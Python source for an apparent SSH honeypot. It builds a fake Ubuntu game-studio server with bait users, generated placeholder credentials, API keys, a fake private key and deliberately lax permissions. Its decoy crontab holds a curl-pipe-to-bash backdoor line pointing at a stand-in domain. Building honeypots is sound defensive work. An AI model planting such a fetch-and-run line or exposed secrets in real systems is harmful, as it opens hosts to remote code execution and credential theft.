#!/usr/bin/env python3
"""
Virtual Filesystem for SSH Honeypot
Provides a realistic Ubuntu 20.04 LTS filesystem structure with game development content
"""

import os
import re
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any
import json
import random
import datetime
import hashlib


class FileNode:
    """Represents a file or directory in the virtual filesystem"""
    
    def __init__(
        self,
        name: str,
        is_dir: bool = False,
        content: str = "",
        permissions: str = "644",
        owner: str = "root",
        group: str = "root",
        size: Optional[int] = None,
        modified: Optional[datetime.datetime] = None
    ):
        self.name = name
        self.is_dir = is_dir
        self.content = content
        self.permissions = permissions
        self.owner = owner
        self.group = group
        self.size = size if size is not None else len(content)
        self.modified = modified or datetime.datetime.now()
        self.children: Dict[str, FileNode] = {} if is_dir else None
        
    def add_child(self, child: 'FileNode') -> None:
        """Add a child node (only for directories)"""
        if self.is_dir:
            self.children[child.name] = child
            
    def get_child(self, name: str) -> Optional['FileNode']:
        """Get a child node by name"""
        if self.is_dir and self.children:
            return self.children.get(name)
        return None
    
    def list_children(self) -> List[str]:
        """List all child names"""
        if self.is_dir and self.children:
            return sorted(self.children.keys())
        return []

    def to_dict(self) -> Dict[str, Any]:
        """Serialize node to dictionary"""
        data = {
            "name": self.name,
            "is_dir": self.is_dir,
            "content": self.content,
            "permissions": self.permissions,
            "owner": self.owner,
            "group": self.group,
            "size": self.size,
            "modified": self.modified.isoformat()
        }
        
        if self.is_dir and self.children:
            data["children"] = {name: child.to_dict() for name, child in self.children.items()}
            
        return data

    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'FileNode':
        """Create node from dictionary"""
        node = cls(
            name=data["name"],
            is_dir=data["is_dir"],
            content=data.get("content", ""),
            permissions=data.get("permissions", "644"),
            owner=data.get("owner", "root"),
            group=data.get("group", "root"),
            size=data.get("size"),
            modified=datetime.datetime.fromisoformat(data["modified"]) if data.get("modified") else None
        )
        
        if node.is_dir and "children" in data:
            for child_name, child_data in data["children"].items():
                child_node = cls.from_dict(child_data)
                node.add_child(child_node)
                
        return node


class VirtualFilesystem:
    """
    Virtual filesystem mimicking Ubuntu 20.04 LTS for game development server
    Based on NexusGames Studio environment from prompt.txt
    """
    
    def __init__(self):
        self.root = FileNode("/", is_dir=True, permissions="755")
        self._initialize_filesystem()

        self.installed_packages = {
            "nginx": "1.18.0-0ubuntu1",
            "mysql-server": "8.0.23-0ubuntu0.20.04.1",
            "openssh-server": "1:8.2p1-4ubuntu0.3",
            "vim": "2:8.1.2269-1ubuntu5",
            "git": "1:2.25.1-1ubuntu3"
        }

    def install_package(self, package_name: str, version: str = "1.0.0"):
        self.installed_packages[package_name] = version
        
    def is_installed(self, package_name: str) -> bool:
        return package_name in self.installed_packages

    def serialize(self) -> Dict[str, Any]:
        """Serialize filesystem to dictionary"""
        return self.root.to_dict()

    def deserialize(self, data: Dict[str, Any]):
        """Restore filesystem from dictionary"""
        self.root = FileNode.from_dict(data)

    def save_state(self, path: str) -> bool:
        """Save filesystem state to JSON file"""
        try:
            data = self.serialize()
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, 'w') as f:
                json.dump(data, f, indent=2)
            return True
        except Exception as e:
            print(f"Error saving filesystem state: {e}")
            return False

    def load_state(self, path: str) -> bool:
        """Load filesystem state from JSON file"""
        if not os.path.exists(path):
            return False
            
        try:
            with open(path, 'r') as f:
                data = json.load(f)
            self.deserialize(data)
            return True
        except Exception as e:
            print(f"Error loading filesystem state: {e}")
            return False
        
    def _initialize_filesystem(self):
        """Initialize the complete Ubuntu filesystem structure"""
        # Create standard Linux directories
        self._create_standard_directories()
        
        # Populate /etc with configuration files
        self._populate_etc()
        
        # Populate /home with user directories
        self._populate_home()
        
        # Populate /opt/games with game projects
        self._populate_game_projects()
        
        # Populate /var with logs and builds
        self._populate_var()
        
        # Populate /srv with assets
        self._populate_srv()
        
        # Populate /backup with backups (misconfigured permissions)
        self._populate_backup()
        
        # Populate /tmp
        self._populate_tmp()
        
    def _create_standard_directories(self):
        """Create standard Linux directory structure"""
        standard_dirs = [
            ("bin", "755", "root", "root"),
            ("boot", "755", "root", "root"),
            ("dev", "755", "root", "root"),
            ("etc", "755", "root", "root"),
            ("home", "755", "root", "root"),
            ("lib", "755", "root", "root"),
            ("lib64", "755", "root", "root"),
            ("media", "755", "root", "root"),
            ("mnt", "755", "root", "root"),
            ("opt", "755", "root", "root"),
            ("proc", "555", "root", "root"),
            ("root", "700", "root", "root"),
            ("run", "755", "root", "root"),
            ("sbin", "755", "root", "root"),
            ("srv", "755", "root", "root"),
            ("sys", "555", "root", "root"),
            ("tmp", "1777", "root", "root"),
            ("usr", "755", "root", "root"),
            ("var", "755", "root", "root"),
            ("backup", "755", "root", "root"),  # Misconfigured backup directory
        ]
        
        for dir_name, perms, owner, group in standard_dirs:
            node = FileNode(dir_name, is_dir=True, permissions=perms, owner=owner, group=group)
            self.root.add_child(node)
            
        # Create usr subdirectories
        usr = self.root.get_child("usr")
        for subdir in ["bin", "lib", "local", "share", "src"]:
            usr.add_child(FileNode(subdir, is_dir=True, permissions="755"))
            
        # Create var subdirectories
        var = self.root.get_child("var")
        for subdir in ["log", "tmp", "cache", "lib", "builds"]:
            var.add_child(FileNode(subdir, is_dir=True, permissions="755"))
            
    def _populate_etc(self):
        """Populate /etc with dynamic, realistic configuration files"""

        
        etc = self.root.get_child("etc")
        
        # Get all users from config
        try:
            from configparser import ConfigParser
            config = ConfigParser()
            config.read("config.ini")
            user_accounts = dict(config.items("user_accounts")) if config.has_section("user_accounts") else {}
        except:
            user_accounts = {
                "alex.chen": "password123",
                "sarah.martinez": "secure456",
                "mike.thompson": "admin789",
                "dev-intern": "intern2024",
                "jenkins": "jenkins!ci",
                "guest": "guest"
            }
        
        # Generate dynamic /etc/passwd with all users
        passwd_lines = [
            "root:x:0:0:root:/root:/bin/bash",
            "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
            "bin:x:2:2:bin:/bin:/usr/sbin/nologin",
            "sys:x:3:3:sys:/dev:/usr/sbin/nologin",
            "sync:x:4:65534:sync:/bin:/bin/sync",
            "games:x:5:60:games:/usr/games:/usr/sbin/nologin",
            "man:x:6:12:man:/var/cache/man:/usr/sbin/nologin",
            "lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin",
            "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin",
            "news:x:9:9:news:/var/spool/news:/usr/sbin/nologin",
            "uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin",
            "proxy:x:13:13:proxy:/bin:/usr/sbin/nologin",
            "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
            "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin",
            "list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin",
            "irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin",
            "gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin",
            "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin",
            "systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin",
            "systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin",
            "systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin",
            "messagebus:x:103:106::/nonexistent:/usr/sbin/nologin",
            "syslog:x:104:110::/home/syslog:/usr/sbin/nologin",
            "_apt:x:105:65534::/nonexistent:/usr/sbin/nologin",
            "tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false",
            "uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin",
            "tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin",
            "landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin",
            "pollinate:x:110:1::/var/cache/pollinate:/bin/false",
            "sshd:x:111:65534::/run/sshd:/usr/sbin/nologin",
        ]
        
        # Add real users dynamically
        uid_start = 1001
        for username in sorted(user_accounts.keys()):
            # Generate realistic full names
            name_parts = username.replace('.', ' ').replace('_', ' ').title()
            if username == "guest":
                full_name = "Guest User"
            elif username == "jenkins":
                full_name = "Jenkins CI User"
            elif username == "dev-intern":
                full_name = "Development Intern"
            else:
                full_name = name_parts
            
            passwd_lines.append(
                f"{username}:x:{uid_start}:{uid_start}:{full_name},,,:/home/{username}:/bin/bash"
            )
            uid_start += 1
        
        passwd_content = "\n".join(passwd_lines) + "\n"
        etc.add_child(FileNode("passwd", content=passwd_content, permissions="644"))
        
        # Generate dynamic /etc/shadow with hashed passwords
        shadow_lines = []
        # Generate date (days since epoch)
        days_since_epoch = (datetime.datetime.now() - datetime.datetime(1970, 1, 1)).days
        
        for username, password in user_accounts.items():
            # Generate realistic password hash (SHA-512)
            salt = hashlib.sha256(username.encode()).hexdigest()[:16]
            # In real system this would be actual crypt hash, but for honeypot we simulate
            password_hash = f"$6$rounds=656000${salt}${hashlib.sha512((password + salt).encode()).hexdigest()[:86]}"
            shadow_lines.append(f"{username}:{password_hash}:{days_since_epoch}:0:99999:7:::")
        
        # Add system users with locked passwords
        shadow_lines.insert(0, f"root:!:{days_since_epoch}:0:99999:7:::")
        shadow_lines.insert(1, f"daemon:*:{days_since_epoch}:0:99999:7:::")
        shadow_lines.insert(2, f"bin:*:{days_since_epoch}:0:99999:7:::")
        
        shadow_content = "\n".join(shadow_lines) + "\n"
        etc.add_child(FileNode("shadow", content=shadow_content, permissions="000", owner="root", group="shadow"))
        
        # Generate dynamic /etc/group
        group_lines = [
            "root:x:0:",
            "daemon:x:1:",
            "bin:x:2:",
            "sys:x:3:",
            "adm:x:4:syslog",
            "tty:x:5:",
            "disk:x:6:",
            "lp:x:7:",
            "mail:x:8:",
            "news:x:9:",
            "uucp:x:10:",
            "man:x:12:",
            "proxy:x:13:",
            "kmem:x:15:",
            "dialout:x:20:",
            "fax:x:21:",
            "voice:x:22:",
            "cdrom:x:24:",
            "floppy:x:25:",
            "tape:x:26:",
            "sudo:x:27:" + ",".join([u for u in user_accounts.keys() if u not in ["guest", "dev-intern"]]),
            "audio:x:29:",
            "dip:x:30:",
            "www-data:x:33:",
            "backup:x:34:",
            "operator:x:37:",
            "list:x:38:",
            "irc:x:39:",
            "src:x:40:",
            "gnats:x:41:",
            "shadow:x:42:",
            "utmp:x:43:",
            "video:x:44:",
            "sasl:x:45:",
            "plugdev:x:46:",
            "staff:x:50:",
            "games:x:60:",
            "users:x:100:",
            "nogroup:x:65534:",
            "docker:x:999:" + ",".join([u for u in user_accounts.keys() if u in ["jenkins", "dev-intern"]]),
        ]
        
        # Add user groups
        gid_start = 1001
        for username in sorted(user_accounts.keys()):
            group_lines.append(f"{username}:x:{gid_start}:")
            gid_start += 1
        
        group_content = "\n".join(group_lines) + "\n"
        etc.add_child(FileNode("group", content=group_content, permissions="644"))
        
        # Dynamic hostname based on random server type
        server_types = ["web", "db", "mail", "app", "api", "cache", "proxy", "file", "backup", "monitor", "build", "ci"]
        server_envs = ["prod", "staging", "dev", "test"]
        random.seed(hash(str(user_accounts.keys())))
        server_type = random.choice(server_types)
        server_env = random.choice(server_envs)
        server_num = random.randint(1, 99)
        hostname = f"{server_type}-srv-{server_env}-{server_num:02d}"
        
        etc.add_child(FileNode("hostname", content=f"{hostname}\n", permissions="644"))
        
        # Dynamic /etc/hosts with realistic internal network
        base_ip = f"10.{random.randint(0, 255)}.{random.randint(0, 255)}"
        hosts_content = f"""127.0.0.1       localhost
    127.0.1.1       {hostname}
    {base_ip}.10    db-primary.nexus.local db-primary
    {base_ip}.11    db-replica.nexus.local db-replica
    {base_ip}.20    redis-master.nexus.local redis-master
    {base_ip}.21    redis-slave.nexus.local redis-slave
    {base_ip}.30    web-lb.nexus.local web-lb
    {base_ip}.40    api-gateway.nexus.local api-gateway
    {base_ip}.50    jenkins.nexus.local jenkins
    {base_ip}.60    gitlab.nexus.local gitlab
    {base_ip}.70    monitoring.nexus.local grafana prometheus
    {base_ip}.80    elk-stack.nexus.local elasticsearch kibana
    {base_ip}.90    vault.nexus.local vault
    {base_ip}.100   k8s-master.nexus.local k8s-master
    {base_ip}.254   gateway.nexus.local gateway

    # The following lines are desirable for IPv6 capable hosts
    ::1     localhost ip6-localhost ip6-loopback
    ff02::1 ip6-allnodes
    ff02::2 ip6-allrouters
    """
        etc.add_child(FileNode("hosts", content=hosts_content, permissions="644"))
        
        # /etc/resolv.conf
        resolv_content = f"""# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
    #     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
    nameserver {base_ip}.1
    nameserver 8.8.8.8
    nameserver 8.8.4.4
    search nexus.local
    options timeout:2 attempts:3 rotate
    """
        etc.add_child(FileNode("resolv.conf", content=resolv_content, permissions="644"))
        
        # /etc/secrets directory with intentional misconfigurations
        secrets_dir = FileNode("secrets", is_dir=True, permissions="755")  # Should be 700
        
        # Database credentials (INTENTIONALLY EXPOSED)
        db_config = f"""[database]
    host={base_ip}.10
    port=5432
    username=nexus_admin
    password=N3xus!Pr0d@2024!DB_{random.randint(1000, 9999)}
    database=nexus_production
    max_connections=100
    ssl_mode=require

    [database_replica]
    host={base_ip}.11
    port=5432
    username=nexus_readonly
    password=R3adOnly!2024_{random.randint(1000, 9999)}
    database=nexus_production

    [redis]
    host={base_ip}.20
    port=6379
    password=R3d1s!C@ch3#2024_{random.randint(1000, 9999)}
    db=0

    [mongodb]
    host={base_ip}.15
    port=27017
    username=mongo_admin
    password=M0ng0!Adm1n_{random.randint(1000, 9999)}
    database=nexus_analytics
    """
        secrets_dir.add_child(FileNode("db_config.ini", content=db_config, permissions="644"))  # Should be 600
        
        # API keys (INTENTIONALLY EXPOSED)
        api_keys = f"""# Production API Keys - DO NOT COMMIT TO GIT!
    # Last updated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

    # Cloud Services
    AWS_ACCESS_KEY_ID=AKIAIOSFODNN7{random.randint(10000000, 99999999)}
    AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCY{hashlib.sha256(str(random.random()).encode()).hexdigest()[:20]}
    AWS_REGION=us-east-1

    # Payment Processing
    STRIPE_SECRET_KEY=sk_live_51{random.randint(100000000000, 999999999999)}abcdefghijklmnopqrstuvwxyz
    STRIPE_PUBLISHABLE_KEY=pk_live_51{random.randint(100000000000, 999999999999)}ABCDEFGHIJKLMNOPQRSTUVWXYZ
    PAYPAL_CLIENT_ID=AYSq3RDGsmBLJE-otTkBtM-jBc{random.randint(10000, 99999)}
    PAYPAL_SECRET=EGnHDxD_qRPOmeKAz1{hashlib.sha256(str(random.random()).encode()).hexdigest()[:30]}

    # Gaming Platforms
    STEAM_API_KEY={hashlib.sha256(str(random.random()).encode()).hexdigest()[:32].upper()}
    EPIC_API_KEY=epic_live_{hashlib.sha256(str(random.random()).encode()).hexdigest()[:40]}
    UNITY_LICENSE_KEY=UL-{random.randint(1000000000, 9999999999)}-ABCD-EFGH-IJKL-MNOP

    # Social Media
    TWITTER_API_KEY={hashlib.sha256(str(random.random()).encode()).hexdigest()[:25]}
    TWITTER_API_SECRET={hashlib.sha256(str(random.random()).encode()).hexdigest()[:50]}
    FACEBOOK_APP_ID={random.randint(100000000000000, 999999999999999)}
    FACEBOOK_APP_SECRET={hashlib.sha256(str(random.random()).encode()).hexdigest()[:32]}

    # Internal Services
    VAULT_TOKEN=s.{hashlib.sha256(str(random.random()).encode()).hexdigest()[:24]}
    JENKINS_API_TOKEN={hashlib.sha256(str(random.random()).encode()).hexdigest()[:40]}
    GITLAB_PRIVATE_TOKEN=glpat-{hashlib.sha256(str(random.random()).encode()).hexdigest()[:20]}

    # Monitoring & Analytics
    DATADOG_API_KEY={hashlib.sha256(str(random.random()).encode()).hexdigest()[:32]}
    NEWRELIC_LICENSE_KEY={hashlib.sha256(str(random.random()).encode()).hexdigest()[:40]}
    SENTRY_DSN=https://{hashlib.sha256(str(random.random()).encode()).hexdigest()[:32]}@sentry.io/{random.randint(1000000, 9999999)}
    """
        secrets_dir.add_child(FileNode("api_keys.env", content=api_keys, permissions="644"))  # Should be 600
        
        # SSH private key (INTENTIONALLY EXPOSED - CRITICAL VULNERABILITY)
        ssh_private_key = f"""-----BEGIN OPENSSH PRIVATE KEY-----
    b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
    NhAAAAAwEAAQAAAYEA{hashlib.sha256(str(random.random()).encode()).hexdigest()[:80]}
    {hashlib.sha256(str(random.random()).encode()).hexdigest()[:80]}
    {hashlib.sha256(str(random.random()).encode()).hexdigest()[:80]}
    AAABAQDGq{hashlib.sha256(str(random.random()).encode()).hexdigest()[:60]}
    -----END OPENSSH PRIVATE KEY-----
    """
        secrets_dir.add_child(FileNode("id_rsa_deploy", content=ssh_private_key, permissions="644"))  # Should be 600
        
        # .env file with all secrets (CRITICAL MISCONFIGURATION)
        env_file = f"""# Production Environment Variables
    NODE_ENV=production
    DEBUG=false
    LOG_LEVEL=info

    # Database
    DATABASE_URL=postgresql://nexus_admin:N3xus!Pr0d@2024!DB_{random.randint(1000, 9999)}@{base_ip}.10:5432/nexus_production
    REDIS_URL=redis://:{hashlib.sha256(str(random.random()).encode()).hexdigest()[:20]}@{base_ip}.20:6379/0

    # JWT Secret
    JWT_SECRET={hashlib.sha256(str(random.random()).encode()).hexdigest()}
    JWT_EXPIRY=86400

    # Encryption
    ENCRYPTION_KEY={hashlib.sha256(str(random.random()).encode()).hexdigest()[:32]}
    SALT_ROUNDS=10

    # Admin Credentials (REMOVE IN PRODUCTION!)
    ADMIN_USERNAME=superadmin
    ADMIN_PASSWORD=Sup3rAdm1n!2024_{random.randint(1000, 9999)}
    ADMIN_EMAIL=admin@nexus.local
    """
        secrets_dir.add_child(FileNode(".env.production", content=env_file, permissions="644"))  # Should be 600
        
        etc.add_child(secrets_dir)
        
        # /etc/os-release
        os_release = """NAME="Ubuntu"
    VERSION="22.04.3 LTS (Jammy Jellyfish)"
    ID=ubuntu
    ID_LIKE=debian
    PRETTY_NAME="Ubuntu 22.04.3 LTS"
    VERSION_ID="22.04"
    HOME_URL="https://www.ubuntu.com/"
    SUPPORT_URL="https://help.ubuntu.com/"
    BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
    PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
    VERSION_CODENAME=jammy
    UBUNTU_CODENAME=jammy
    """
        etc.add_child(FileNode("os-release", content=os_release, permissions="644"))
        
        # /etc/issue
        issue_content = f"""Ubuntu 22.04.3 LTS \\n \\l

    {hostname} - Nexus Production Server
    Authorized Access Only - All Activity Monitored

    """
        etc.add_child(FileNode("issue", content=issue_content, permissions="644"))
        
        # /etc/motd (Message of the Day)
        motd_content = f"""
    ╔══════════════════════════════════════════════════════════════╗
    ║                  NEXUS PRODUCTION ENVIRONMENT                ║
    ║                    {hostname.upper().center(40)}    ║
    ╚══════════════════════════════════════════════════════════════╝

    ⚠️  WARNING: This system contains sensitive corporate data
    📊 All access attempts are monitored and logged
    🔒 Unauthorized access is strictly prohibited

    System Information:
    • Hostname: {hostname}
    • Environment: Production
    • Last Updated: {datetime.datetime.now().strftime('%Y-%m-%d')}
    
    For support: sysadmin@nexus.local
    Security incidents: security@nexus.local

    """
        etc.add_child(FileNode("motd", content=motd_content, permissions="644"))
        
        # /etc/ssh/sshd_config (with some security issues)
        sshd_config = f"""# SSH Server Configuration
    # WARNING: Some settings may not be secure

    Port 22
    Protocol 2
    HostKey /etc/ssh/ssh_host_rsa_key
    HostKey /etc/ssh/ssh_host_ecdsa_key
    HostKey /etc/ssh/ssh_host_ed25519_key

    # Logging
    SyslogFacility AUTH
    LogLevel INFO

    # Authentication
    PermitRootLogin yes  # SECURITY ISSUE: Should be 'no'
    PasswordAuthentication yes
    PermitEmptyPasswords no
    ChallengeResponseAuthentication no
    PubkeyAuthentication yes
    AuthorizedKeysFile .ssh/authorized_keys

    # Security
    X11Forwarding yes
    PrintMotd yes
    PrintLastLog yes
    TCPKeepAlive yes
    PermitUserEnvironment no
    Compression delayed
    ClientAliveInterval 120
    ClientAliveCountMax 3

    # Allow specific users
    AllowUsers {' '.join(user_accounts.keys())}

    # Subsystems
    Subsystem sftp /usr/lib/openssh/sftp-server
    """
        ssh_dir = FileNode("ssh", is_dir=True, permissions="755")
        ssh_dir.add_child(FileNode("sshd_config", content=sshd_config, permissions="644"))
        etc.add_child(ssh_dir)
        
        # /etc/crontab with suspicious entries
        crontab_content = f"""# /etc/crontab: system-wide crontab
    SHELL=/bin/bash
    PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

    # m h dom mon dow user  command
    17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
    25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
    47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
    52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

    # Backup jobs
    0 2 * * * root /usr/local/bin/backup.sh >> /var/log/backup.log 2>&1
    30 3 * * * root /usr/local/bin/db_backup.sh >> /var/log/db_backup.log 2>&1

    # Monitoring
    */5 * * * * root /usr/local/bin/health_check.sh
    0 */6 * * * root /usr/local/bin/log_rotation.sh

    # Suspicious entry (potential backdoor)
    */10 * * * * root curl -s http://suspicious-domain.com/check.sh | bash
    """
        etc.add_child(FileNode("crontab", content=crontab_content, permissions="644"))

        
    def _populate_home(self):
        """Populate /home with user directories"""
        home = self.root.get_child("home")
        
        users = [
            ("alex.chen", "1001", "1001"),
            ("sarah.martinez", "1002", "1002"),
            ("mike.thompson", "1003", "1003"),
            ("dev-intern", "1004", "1004"),
            ("jenkins", "1005", "1005"),
            ("guest", "1006", "1006"),
        ]
        
        for username, uid, gid in users:
            user_dir = FileNode(username, is_dir=True, permissions="755", owner=username, group=username)
            
            # Add .bashrc
            bashrc = f"""# ~/.bashrc for {username}
export PATH=/usr/local/bin:/usr/bin:/bin:/usr/games
export EDITOR=vim
export PS1='\\u@\\h:\\w\\$ '

alias ll='ls -la'
alias gs='git status'
alias gp='git pull'
"""
            user_dir.add_child(FileNode(".bashrc", content=bashrc, permissions="644", owner=username, group=username))
            
            # Add .bash_history with realistic commands
            if username == "alex.chen":
                history = """cd /opt/games/Stellar-Conquest
git pull origin main
./build.sh
cd /opt/games/Project-Phoenix
ls -la
cat README.md
vim src/main.cpp
git commit -am "Fixed memory leak in renderer"
git push
sudo systemctl restart nginx
"""
                user_dir.add_child(FileNode(".bash_history", content=history, permissions="600", owner=username, group=username))
            
            # Add Documents directory with personal files
            docs_dir = FileNode("Documents", is_dir=True, permissions="755", owner=username, group=username)
            if username == "alex.chen":
                resume = """ALEX CHEN
Senior Game Developer
alex.chen@nexusgames.com

EXPERIENCE:
- NexusGames Studio (2020-Present): Lead Developer on Stellar Conquest
- Previous Company (2018-2020): Unity Developer

SKILLS: C++, C#, Unity, Unreal Engine, Python
"""
                docs_dir.add_child(FileNode("resume.txt", content=resume, permissions="644", owner=username, group=username))
            
            user_dir.add_child(docs_dir)
            home.add_child(user_dir)
            
    def _populate_game_projects(self):
        """Populate /opt/games with game development projects"""
        opt = self.root.get_child("opt")
        games_dir = FileNode("games", is_dir=True, permissions="755", owner="root", group="developers")
        
        projects = [
            ("Stellar-Conquest", "Space strategy game - CONFIDENTIAL"),
            ("Mystic-Realms", "Fantasy RPG - In Production"),
            ("Racing-Thunder", "Mobile racing game - Beta"),
            ("Project-Phoenix", "Unannounced AAA title - TOP SECRET"),
        ]
        
        for project_name, description in projects:
            project_dir = FileNode(project_name, is_dir=True, permissions="755", owner="root", group="developers")
            
            # README.md
            readme = f"""# {project_name}

{description}

## Build Instructions
```bash
./build.sh
```

## Team
- Lead: Alex Chen
- Art: Sarah Martinez  
- Programming: Mike Thompson

## Status
Active development - Q2 2024 release target
"""
            project_dir.add_child(FileNode("README.md", content=readme, permissions="644"))
            
            # Source directory
            src_dir = FileNode("src", is_dir=True, permissions="755")
            
            # Sample source files
            main_cpp = """#include <iostream>
#include "game_engine.h"

int main() {
    GameEngine engine;
    engine.initialize();
    engine.run();
    return 0;
}
"""
            src_dir.add_child(FileNode("main.cpp", content=main_cpp, permissions="644"))
            
            game_engine_h = """#ifndef GAME_ENGINE_H
#define GAME_ENGINE_H

class GameEngine {
public:
    void initialize();
    void run();
    void shutdown();
private:
    // Implementation details
};

#endif
"""
            src_dir.add_child(FileNode("game_engine.h", content=game_engine_h, permissions="644"))
            
            project_dir.add_child(src_dir)
            
            # Build script
            build_script = """#!/bin/bash
echo "Building {project_name}..."
mkdir -p build
cd build
cmake ..
make -j4
echo "Build complete!"
"""
            project_dir.add_child(FileNode("build.sh", content=build_script, permissions="755"))
            
            games_dir.add_child(project_dir)
            
        opt.add_child(games_dir)
        
    def _populate_var(self):
        """Populate /var with logs and build artifacts"""
        var = self.root.get_child("var")
        
        # /var/log
        log_dir = var.get_child("log")
        
        # auth.log
        auth_log = """Dec  2 10:23:15 corp-srv-01 sshd[1234]: Accepted password for alex.chen from 192.168.1.100 port 52341 ssh2
Dec  2 10:45:32 corp-srv-01 sshd[1245]: Failed password for invalid user admin from 203.0.113.42 port 48291 ssh2
Dec  2 11:12:08 corp-srv-01 sudo: alex.chen : TTY=pts/0 ; PWD=/home/alex.chen ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
Dec  2 12:03:45 corp-srv-01 sshd[1256]: Accepted password for jenkins from 10.0.0.2 port 41234 ssh2
"""
        log_dir.add_child(FileNode("auth.log", content=auth_log, permissions="640", owner="root", group="adm"))
        
        # syslog
        syslog = """Dec  2 10:00:01 corp-srv-01 CRON[1123]: (root) CMD (/usr/local/bin/backup.sh)
Dec  2 10:15:23 corp-srv-01 systemd[1]: Started Daily apt download activities.
Dec  2 11:30:45 corp-srv-01 kernel: [12345.678901] Out of memory: Kill process 5678 (chrome) score 890 or sacrifice child
"""
        log_dir.add_child(FileNode("syslog", content=syslog, permissions="640", owner="root", group="adm"))
        
        # /var/builds
        builds_dir = var.get_child("builds")
        builds_dir.add_child(FileNode("stellar-conquest-v1.2.3.tar.gz", content="[Binary build artifact]", permissions="644", size=15728640))
        builds_dir.add_child(FileNode("mystic-realms-latest.zip", content="[Binary build artifact]", permissions="644", size=28934567))
        
    def _populate_srv(self):
        """Populate /srv with game assets"""
        srv = self.root.get_child("srv")
        
        assets_dir = FileNode("assets", is_dir=True, permissions="755")
        
        # Textures
        textures_dir = FileNode("textures", is_dir=True, permissions="755")
        textures_dir.add_child(FileNode("spaceship_diffuse.png", content="[PNG image data]", permissions="644", size=2048576))
        textures_dir.add_child(FileNode("terrain_normal.png", content="[PNG image data]", permissions="644", size=4096000))
        assets_dir.add_child(textures_dir)
        
        # Models
        models_dir = FileNode("models", is_dir=True, permissions="755")
        models_dir.add_child(FileNode("character_rig.fbx", content="[FBX model data]", permissions="644", size=8192000))
        assets_dir.add_child(models_dir)
        
        # Audio
        audio_dir = FileNode("audio", is_dir=True, permissions="755")
        audio_dir.add_child(FileNode("background_music.mp3", content="[MP3 audio data]", permissions="644", size=5242880))
        assets_dir.add_child(audio_dir)
        
        srv.add_child(assets_dir)
        
    def _populate_backup(self):
        """Populate /backup with database backups (world-readable - misconfiguration)"""
        backup = self.root.get_child("backup")
        
        # Database backup with sensitive data (misconfigured permissions)
        db_backup = """-- NexusGames Production Database Backup
-- Date: 2024-12-01

INSERT INTO users VALUES (1, 'alex.chen@nexusgames.com', '$2b$12$...');
INSERT INTO financial_data VALUES (1, 'Q3 Revenue', 2300000.00);
INSERT INTO salaries VALUES (1, 'alex.chen', 125000.00);
"""
        backup.add_child(FileNode("db_backup_2024-12-01.sql", content=db_backup, permissions="644"))  # Should be 600!
        
        # Project snapshots
        backup.add_child(FileNode("project-phoenix-snapshot.tar.gz", content="[Compressed backup]", permissions="644", size=52428800))
        
    def _populate_tmp(self):
        """Populate /tmp with temporary files"""
        tmp = self.root.get_child("tmp")
        
        uploads_dir = FileNode("uploads", is_dir=True, permissions="777")
        tmp.add_child(uploads_dir)
        
    def resolve_path(self, path: str, current_dir: str = "/") -> Optional[str]:
        """
        Resolve a path (relative or absolute) to an absolute path
        
        Args:
            path: Path to resolve
            current_dir: Current working directory
            
        Returns:
            Absolute path or None if invalid
        """
        if not path:
            return current_dir
            
        # Handle special cases
        if path == "~":
            return "/home/guest"  # Default user
        if path.startswith("~/"):
            return "/home/guest/" + path[2:]
            
        # Handle absolute paths
        if path.startswith("/"):
            abs_path = path
        else:
            # Relative path
            if current_dir.endswith("/"):
                abs_path = current_dir + path
            else:
                abs_path = current_dir + "/" + path
                
        # Normalize path (handle .. and .)
        parts = []
        for part in abs_path.split("/"):
            if part == "" or part == ".":
                continue
            elif part == "..":
                if parts:
                    parts.pop()
            else:
                parts.append(part)
                
        return "/" + "/".join(parts) if parts else "/"
        
    def _get_node(self, path: str) -> Optional[FileNode]:
        """Get a node by absolute path"""
        if path == "/":
            return self.root
            
        parts = [p for p in path.split("/") if p]
        current = self.root
        
        for part in parts:
            if not current or not current.is_dir:
                return None
            current = current.get_child(part)
            
        return current
        
    def exists(self, path: str, current_dir: str = "/") -> bool:
        """Check if a path exists"""
        abs_path = self.resolve_path(path, current_dir)
        return self._get_node(abs_path) is not None
        
    def is_directory(self, path: str, current_dir: str = "/") -> bool:
        """Check if path is a directory"""
        abs_path = self.resolve_path(path, current_dir)
        node = self._get_node(abs_path)
        return node is not None and node.is_dir
        
